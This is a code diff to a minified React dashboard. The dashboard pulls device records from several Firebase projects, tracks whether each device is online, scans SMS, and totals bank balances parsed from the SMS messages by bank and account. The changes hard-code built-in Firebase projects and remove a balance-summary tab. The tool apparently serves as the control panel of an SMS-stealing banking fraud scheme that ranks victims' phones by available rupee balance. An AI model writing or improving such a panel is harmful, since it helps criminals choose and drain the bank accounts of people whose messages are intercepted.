+                                    children: _.replace(/^https:\/\//, "").replace(/\.firebaseio\.com$/, "")
+                                }, _))
                             })]
                         }), r.jsxs("div", {
-                            children: [r.jsx("label", {
-                                className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
-                                children: "Authentication Key / Secret (Optional)"
-                            }), r.jsx("input", {
-                                type: "password",
-                                value: h,
-                                onChange: _ => o(_.target.value),
-                                placeholder: "Leave blank for public Firebase",
-                                className: "w-full px-4 py-3 rounded-xl bg-muted/50 border border-border focus:border-red-500 focus:ring-2 focus:ring-red-500/20 outline-none text-sm text-foreground placeholder:text-muted-foreground/50 transition-all font-mono"
+                            className: "p-3 rounded-xl bg-emerald-950/20 border border-emerald-900/30",
+                            children: [r.jsx("p", {
+                                className: "text-xs font-semibold text-emerald-400",
+                                children: `${BUILT_IN_FIREBASE_URLS.length} Firebase projects built in`
+                            }), r.jsx("p", {
+                                className: "text-[11px] text-muted-foreground mt-1",
+                                children: "No manual Firebase URL or authentication key is required."
                             })]
                         })]
                     }), r.jsxs("div", {
@@ -19964,16 +20152,15 @@ Error: ${_t}`)
                                 className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
                             }) : r.jsx(hh, {
                                 className: "w-4 h-4"
-                            }), w ? "Connecting…" : "Save & Connect"]
+                            }), w ? "Connecting…" : "Connect Selected"]
                         }), r.jsx("button", {
                             onClick: () => {
-                                S(!1), T(""), y(), p(""), o("")
+                                S(!1), T(""), y(), p(BUILT_IN_FIREBASE_URL), o("")
                             },
                             className: "px-5 py-3 rounded-xl bg-muted hover:bg-accent text-muted-foreground text-sm font-medium transition-colors",
                             children: "Cancel"
                         })]
-                    })]
-                }), x && r.jsx("p", {
+                    })]                }), x && r.jsx("p", {
                     className: "mt-4 text-center text-sm text-red-400 animate-fade-up",
                     children: x
                 })]
@@ -21128,7 +21315,7 @@ function p1({
 }) {
     const [firebaseSources, setFirebaseSources] = jt.useState(() => (multiConnections?.length ? multiConnections : [{ url: A, key: tt }]).filter(source => source && typeof source.url === "string" && source.url.trim())), isMultiFirebase = firebaseSources.length > 1, sourcesRef = jt.useRef(firebaseSources);
     sourcesRef.current = firebaseSources;
-    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), [firebaseScope, setFirebaseScope] = jt.useState("online"), [selectedFirebase, setSelectedFirebase] = jt.useState(""), [selectedFirebaseBank, setSelectedFirebaseBank] = jt.useState(""), [quickAddOpen, setQuickAddOpen] = jt.useState(!1), [quickUrl, setQuickUrl] = jt.useState(""), [quickKey, setQuickKey] = jt.useState(""), [quickBusy, setQuickBusy] = jt.useState(!1), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
+    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
         k(U), setTimeout(() => k(""), 5000)
     }, []), D = jt.useCallback(async (U, J) => {
         try {
@@ -21217,29 +21404,7 @@ function p1({
         window.addEventListener("popstate", U);
         return () => window.removeEventListener("popstate", U)
     }, []);
-    const quickAddFirebase = async () => {
-            const url = normalizeFirebaseUrl(quickUrl), key = optionalFirebaseKey(quickKey);
-            if (!/^https:\/\/[a-z0-9-]+(?:-default-rtdb)?\.firebaseio\.com$/i.test(url)) return xt("Enter a valid Firebase URL");
-            if (sourcesRef.current.some(source => source.url === url)) return xt("Firebase already connected");
-            setQuickBusy(!0);
-            try {
-                await yn(url, key, "clients");
-                const item = { id: Date.now(), url, key, date: new Date().toLocaleString() }, next = [...sourcesRef.current, item];
-                sourcesRef.current = next, setFirebaseSources(next);
-                const saved = Yp();
-                saved.some(source => source.url === url) || nh([...saved, item]);
-                setQuickUrl(""), setQuickKey(""), setQuickAddOpen(!1), xt("Firebase connected");
-                setTimeout(() => at(!1), 0)
-            } catch { xt("Firebase connection failed — check URL or database access") }
-            finally { setQuickBusy(!1) }
-        },
-        removeFirebase = url => {
-            if (!confirm("Remove this Firebase connection?")) return;
-            const next = sourcesRef.current.filter(source => source.url !== url);
-            sourcesRef.current = next, setFirebaseSources(next), nh(Yp().filter(source => source.url !== url)), S(devices => devices.filter(device => (device._fbUrl || A) !== url));
-            selectedFirebase === url && (setSelectedFirebase(""), setSelectedFirebaseBank("")), w === "balances" && next.length < 2 && C("firebase"), xt("Firebase removed")
-        },
-        Z = async () => {
+    const Z = async () => {
             confirm("Logout from current account?") && b()
         },
         q = U => {
@@ -21285,25 +21450,6 @@ function p1({
                 return jr !== sr ? jr-sr : St.total-J.total
             })
         }, [d,balanceScope]),
-        firebaseSummary = jt.useMemo(() => {
-            const sources = new Map(firebaseSources.map(source => [source.url, { url:source.url, label:maskFirebase(source.url), total:0, totalConnections:0, onlineConnections:0, banks:new Map }]));
-            d.forEach(dev => {
-                const source = sources.get(dev._fbUrl||A) || { url:dev._fbUrl||A, label:maskFirebase(dev._fbUrl||A), total:0, totalConnections:0, onlineConnections:0, banks:new Map };
-                source.totalConnections += 1, dev.status && (source.onlineConnections += 1);
-                if (firebaseScope === "all" || dev.status) {
-                    const seen = new Set;
-                    (dev.smsAnalysis?.bankBalances||[]).filter(balance => !isBlockedBankLabel([balance.bankName,balance.senderName,balance.rawSms].filter(Boolean).join(" "))).forEach(balance => {
-                        const bankName = balance.bankName||"Unknown Bank", account = `${bankName}|${balance.accountLast4||dev.id}`;
-                        if (seen.has(account)) return;
-                        seen.add(account);
-                        const amount = Number(String(balance.availableBalance||0).replace(/[^0-9.-]/g,""))||0, bank = source.banks.get(bankName)||{ bankName, total:0, accounts:0, entries:[] };
-                        bank.total += amount, bank.accounts += 1, bank.entries.push({ dev, balance:amount, last4:balance.accountLast4||"—" }), source.banks.set(bankName,bank), source.total += amount
-                    })
-                }
-                sources.set(source.url,source)
-            });
-            return [...sources.values()].map(source => ({ ...source, banks:[...source.banks.values()].map(bank => ({ ...bank, entries:bank.entries.sort((J,St)=>J.dev.status!==St.dev.status?(J.dev.status?-1:1):St.balance-J.balance) })).sort((J,St)=>St.total-J.total) })).sort((J,St)=>St.total-J.total)
-        }, [d,firebaseScope,A,firebaseSources]),
         X = L.toLocaleTimeString("en-IN", {
             hour: "2-digit",
             minute: "2-digit",
@@ -21431,10 +21577,10 @@ function p1({
                 }), r.jsxs("div", {
                     className: "ml-auto flex items-center gap-2 flex-wrap",
                     children: [
-                        ["all", "online", "offline", "upi", "bank", "card", ...(isMultiFirebase ? ["balances"] : []), "firebase"].map(U => r.jsx("button", {
+                        ["all", "online", "offline", "upi", "bank", "card", ...(isMultiFirebase ? ["balances"] : [])].map(U => r.jsx("button", {
                             onClick: () => C(U),
                             className: `px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${w===U?U==="bank"||U==="balances"?"bg-emerald-600/20 text-emerald-400 border border-emerald-600/30":U==="card"?"bg-purple-600/20 text-purple-400 border border-purple-600/30":"bg-red-600/20 text-red-400 border border-red-600/30":"text-[#555] hover:text-[#888]"}`,
-                            children: U === "balances" ? "Balances" : U === "firebase" ? "Firebase Summary" : U
+                            children: U === "balances" ? "Balances" : U
                         }, U)), r.jsx("div", {
                             className: "w-px h-4 bg-[#222]"
                         }), r.jsxs("select", {
@@ -21484,35 +21630,6 @@ function p1({
                         length: 6
                     }).map((U, J) => r.jsx(m1, {}, J))
                 })]
-            }) : w === "firebase" ? r.jsxs("section", {
-                className: "firebase-summary-section",
-                children: [r.jsxs("div", {
-                    className: "firebase-summary-head",
-                    children: [r.jsxs("div", { children: [r.jsx("h2", { children: "Firebase Balance Summary" }), r.jsx("p", { children: firebaseScope === "online" ? "Balance from online connections only" : "Balance from all connections" })] }), r.jsxs("div", {
-                        className: "firebase-summary-actions",
-                        children: [r.jsx("button", { className: "quick-add-firebase-toggle", onClick: () => setQuickAddOpen(!quickAddOpen), children: quickAddOpen ? "× Close" : "+ New Firebase" }), r.jsxs("div", { className: "balance-scope-toggle",
-                        children: [r.jsx("button", { className: firebaseScope === "online" ? "active" : "", onClick: () => { setFirebaseScope("online"), setSelectedFirebase(""), setSelectedFirebaseBank("") }, children: "Online" }), r.jsx("button", { className: firebaseScope === "all" ? "active" : "", onClick: () => { setFirebaseScope("all"), setSelectedFirebase(""), setSelectedFirebaseBank("") }, children: "All" })]
-                        })]
-                    })]
-                }), quickAddOpen && r.jsxs("div", { className: "quick-add-firebase-form", children: [r.jsx("input", { value:quickUrl, onChange:U=>setQuickUrl(U.target.value), onKeyDown:U=>U.key==="Enter"&&!quickBusy&&quickAddFirebase(), placeholder:"https://project-default-rtdb.firebaseio.com", "aria-label":"Firebase URL" }), r.jsx("input", { type:"password", value:quickKey, onChange:U=>setQuickKey(U.target.value), onKeyDown:U=>U.key==="Enter"&&!quickBusy&&quickAddFirebase(), placeholder:"Secret key (optional)", "aria-label":"Firebase secret key" }), r.jsx("button", { onClick:quickAddFirebase, disabled:quickBusy, children:quickBusy?"Connecting…":"Connect Firebase" })] }), r.jsx("div", {
-                    className: "firebase-summary-grid",
-                    children: firebaseSummary.length ? firebaseSummary.map(U => r.jsxs("div", {
-                        className: `firebase-summary-card-shell ${selectedFirebase===U.url?"selected":""}`,
-                        children: [r.jsxs("button", { className:"firebase-summary-card-main", onClick: () => { setSelectedFirebase(selectedFirebase===U.url?"":U.url), setSelectedFirebaseBank("") }, children: [r.jsxs("div", { children: [r.jsx("strong", { children: `Firebase · ${U.label}` }), r.jsxs("span", { children: [U.onlineConnections, " online / ", U.totalConnections, " total"] })] }), r.jsxs("b", { children: ["₹", Pl(U.total)] })] }), r.jsx("button", { className:"firebase-summary-remove", title:"Remove Firebase", "aria-label":`Remove ${U.label}`, onClick:()=>removeFirebase(U.url), children:"×" })]
-                    }, U.url)) : r.jsxs("div", { className:"firebase-summary-empty", children:[r.jsx("strong",{children:"No Firebase connected"}),r.jsx("span",{children:"Use + New Firebase to connect one without leaving this page."})] })
-                }), selectedFirebase && (() => {
-                    const U = firebaseSummary.find(J => J.url===selectedFirebase);
-                    return U ? r.jsxs("div", {
-                        className: "firebase-bank-panel",
-                        children: [r.jsxs("div", { className: "firebase-bank-panel-head", children: [r.jsxs("div", { children: [r.jsx("strong", { children: `Firebase · ${U.label}` }), r.jsx("span", { children: "Select a bank to view connections" })] }), r.jsx("button", { onClick:()=>{setSelectedFirebase(""),setSelectedFirebaseBank("")}, children:"Close" })] }), U.banks.length ? r.jsx("div", {
-                            className: "firebase-bank-grid",
-                            children: U.banks.map(J => r.jsxs("button", { className:selectedFirebaseBank===J.bankName?"selected":"", onClick:()=>setSelectedFirebaseBank(selectedFirebaseBank===J.bankName?"":J.bankName), children:[r.jsx("span",{children:J.bankName}),r.jsxs("strong",{children:["₹",Pl(J.total)]}),r.jsxs("small",{children:[J.accounts," account",J.accounts===1?"":"s"]})] },J.bankName))
-                        }) : r.jsx("p", { className:"bank-consolidated-empty", children:"No bank balance detected for this Firebase" }), selectedFirebaseBank && (()=>{
-                            const J=U.banks.find(St=>St.bankName===selectedFirebaseBank);
-                            return J ? r.jsx("div", { className:"bank-account-list firebase-account-list", children:J.entries.map((St,yt)=>r.jsxs("button",{onClick:()=>q(St.dev),children:[r.jsxs("div",{children:[r.jsx("strong",{children:St.dev.name}),r.jsxs("span",{children:["A/c ••",St.last4," · ",St.dev.status?"Online":"Offline"]})]}),r.jsxs("b",{children:["₹",Pl(St.balance)]})]},`${St.dev.id}-${St.last4}-${yt}`)) }) : null
-                        })()]
-                    }) : null
-                })()]
             }) : w === "balances" && isMultiFirebase ? r.jsxs("section", {
                 className: "bank-consolidated-wrap bank-consolidated-section",
                 children: [r.jsxs("div", {
